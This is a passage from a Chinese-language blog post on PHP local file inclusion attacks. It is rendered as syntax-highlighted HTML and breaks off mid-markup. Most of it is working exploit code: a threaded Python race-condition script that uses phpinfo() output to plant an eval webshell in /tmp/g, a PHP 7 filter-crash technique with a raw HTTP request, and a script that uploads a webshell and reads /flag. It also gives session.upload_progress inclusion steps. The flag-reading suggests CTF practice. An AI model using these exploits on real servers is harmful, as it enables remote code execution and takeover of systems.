class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup</span>(<span class=\"params\">host, port</span>):</span><br><span class=\"line\">    TAG = <span class=\"string\">&quot;Security Test&quot;</span></span><br><span class=\"line\">    PAYLOAD = <span class=\"string\">&quot;&quot;&quot;%s\\r</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php fputs(fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[a]);&#x27;)?&gt;\\r&quot;&quot;&quot;</span> % TAG</span><br><span class=\"line\">    REQ1_DATA = <span class=\"string\">&quot;&quot;&quot;-----------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: text/plain\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class=\"line\">    padding = <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">5000</span></span><br><span class=\"line\">    REQ1 = <span class=\"string\">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot; HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_USER_AGENT: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PRAGMA: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s&quot;&quot;&quot;</span> % (<span class=\"built_in\">len</span>(REQ1_DATA), host, REQ1_DATA)</span><br><span class=\"line\">    <span class=\"comment\"># modify this to suit the LFI script</span></span><br><span class=\"line\">    LFIREQ = <span class=\"string\">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/4.0\\r</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: Keep-Alive\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (REQ1, TAG, LFIREQ)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">phpInfoLFI</span>(<span class=\"params\">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s2.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    d = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(d) &lt; offset:</span><br><span class=\"line\">        d += s.recv(offset)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        i = d.index(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">        fn = d[i + <span class=\"number\">17</span>:i + <span class=\"number\">44</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    s2.send(lfireq % (fn, host))</span><br><span class=\"line\">    d = s2.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    s2.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> d.find(tag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">counter = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadWorker</span>(threading.Thread):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, e, l, m, *args</span>):</span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self.event = e</span><br><span class=\"line\">        self.lock = l</span><br><span class=\"line\">        self.maxattempts = m</span><br><span class=\"line\">        self.args = args</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">global</span> counter</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.event.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">with</span> self.lock:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= self.maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                counter += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                x = phpInfoLFI(*self.args)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> self.event.is_set():</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> x:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class=\"line\">                    self.event.<span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> socket.error:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getOffset</span>(<span class=\"params\">host, port, phpinforeq</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\"></span><br><span class=\"line\">    d = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        i = s.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">        d += i</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i == <span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\"># detect the final chunk</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.endswith(<span class=\"string\">&quot;0\\r\\n\\r\\n&quot;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    i = d.find(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i == -<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;found %s at %i&quot;</span> % (d[i:i + <span class=\"number\">10</span>], i)</span><br><span class=\"line\">    <span class=\"comment\"># padded up a bit</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> i + <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;LFI With PHPInfo()&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;-=&quot;</span> * <span class=\"number\">30</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        host = socket.gethostbyname(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class=\"number\">1</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    port = <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        port = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class=\"number\">2</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    poolsz = <span class=\"number\">10</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        poolsz = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">3</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class=\"number\">3</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Getting initial offset...&quot;</span>,</span><br><span class=\"line\">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class=\"line\">    offset = getOffset(host, port, reqphp)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    maxattempts = <span class=\"number\">1000</span></span><br><span class=\"line\">    e = threading.Event()</span><br><span class=\"line\">    l = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    tp = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, poolsz):</span><br><span class=\"line\">        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> e.wait(<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> l:</span><br><span class=\"line\">                sys.stdout.write(<span class=\"string\">&quot;\\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class=\"line\">                sys.stdout.flush()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&quot;Woot!  \\m/&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&quot;:(&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nTelling threads to shutdown...&quot;</span></span><br><span class=\"line\">        e.<span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"lfiphp7-collapse\"><a class=\"markdownIt-Anchor\" href=\"#lfiphp7-collapse\">#</a> LFI+php7 collapse</h2>\n<p>php 7.0-7.1.19</p>\n<p>当不存在 phpinfo 时，可以利用 php7 的特性</p>\n<p><code>http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</code>  导致 php 崩溃，临时文件遗留了下来</p>\n<p>在上传时抓包，使用以上 payload 进行崩溃</p>\n<p>接下来需要找到刚刚的临时文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a = @$_GET[&#x27;dir&#x27;];</span><br><span class=\"line\">if(!$a)&#123;</span><br><span class=\"line\">$a = &#x27;/tmp&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>\n<p>然后写 shell 包含随便搞</p>\n<p>两种崩溃方法：</p>\n<p>抓包时修改</p>\n<p>先写个文件上传页面，上传时抓包，修改 url 和文件内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /upload_file.php?file=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Content-Length: 290</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\">sec-ch-ua-mobile: ?0</span><br><span class=\"line\">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://127.0.0.1:18888</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Sec-Fetch-Site: same-origin</span><br><span class=\"line\">Sec-Fetch-Mode: navigate</span><br><span class=\"line\">Sec-Fetch-User: ?1</span><br><span class=\"line\">Sec-Fetch-Dest: document</span><br><span class=\"line\">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=9pji5c42u9migge868i8u083r7; ZDEDebuggerPresent=php,phtml,php3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提交</span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC--</span><br></pre></td></tr></table></figure>\n<p>写 python 包崩溃</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from io import BytesIO</span><br><span class=\"line\">import re</span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  &#x27;file&#x27;: BytesIO(&#x27;&lt;?php eval($_REQUEST[sky]);&#x27;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = &#x27;http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class=\"line\">try:</span><br><span class=\"line\">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class=\"line\">except:</span><br><span class=\"line\">url = &#x27;http://ip/dir.php&#x27;</span><br><span class=\"line\">r = requests.get(url)</span><br><span class=\"line\">data = re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0)</span><br><span class=\"line\">url = &quot;http://ip/index.php?file=/tmp/&quot;+data</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">&#x27;sky&#x27;:&quot;readfile(&#x27;/flag&#x27;);&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r =  requests.post(url=url,data=data)</span><br><span class=\"line\">print r.content</span><br></pre></td></tr></table></figure>\n<h2 id=\"docker中文件包含\"><a class=\"markdownIt-Anchor\" href=\"#docker中文件包含\">#</a> docker 中文件包含</h2>\n<p>1. 包含日志文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">access.log -&gt; /dev/stdout</span><br><span class=\"line\">error.log -&gt; /dev/stderr</span><br></pre></td></tr></table></figure>\n<p>此时日志被重定向到标准输出中，不能包含</p>\n<p>此时包含这些 Web 日志会出现 <code>include(/dev/pts/0): failed to open stream: Permission denied</code>  的错误，因为 PHP 没有权限包含设备文件：</p>\n<p>远程包含因为默认不开启，所以我们也不作为一个候选项，想要 getshell 还是需要找到一个可以控制内容的文件进行包含。</p>\n<p>2.phpinfo 文件包含</p>\n<p>同样 post 一个大文件，然后利用时间竞争</p>\n<p>脚本和之前的脚本类似，但更改了切片的位置</p>\n<p><code>fn = d[i+17:i+31]</code></p>\n<p>3.Windows 中通配符</p>\n<p>在临时文件包含中，我们详细讲过通配符</p>\n<ul>\n<li>DOS_STAR：即  <code>&lt;</code> ，匹配 0 个以上的字符</li>\n<li>DOS_QM：即 <code>&gt;</code> ，匹配 1 个字符</li>\n<li>DOS_DOT：即 <code>&quot;</code> ，匹配点号</li>\n</ul>\n<p>有了通配符，我们就可以匹配临时文件，并修改其内容</p>\n<p>一般我们会用 fputs 和 fopen 写到临时文件中，这样临时文件即使删除，我们可以将我们的马写到其他的目录中</p>\n<p>4.session.upload_progress</p>\n<p>php version &gt; 7</p>\n<p>session.auto_start 顾名思义，如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start ()。但默认情况下，也是通常情况下，这个选项都是关闭的。</p>\n<p>session.upload_progress 最初是 PHP 为上传进度条设计的一个功能，在上传文件较大的情况下，PHP 将进行流式上传，并将进度信息放在 Session 中（包含用户可控的值），即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。</p>\n<p>PHP 在开启了 <code>session.upload_progress.enable</code>  后（在包括 Docker 的大部分环境下默认是开启的），将会把用户上传文件的信息保存在 Session 中，而 PHP 的 Session 默认是保存在文件里的。</p>\n<p>利用条件：</p>\n<ul>\n<li>目标环境开启了 <code>session.upload_progress.enable</code>  选项</li>\n<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是 <code>PHP_SESSION_UPLOAD_PROGRESS</code>  的字段</li>\n<li>请求的 Cookie 中包含 Session ID</li>\n</ul>\n<p>构造如下上传包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">\t&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo(); ?&gt;&quot; /&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>上传抓包时设置 cookie: PHPSESSID=hahaha</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 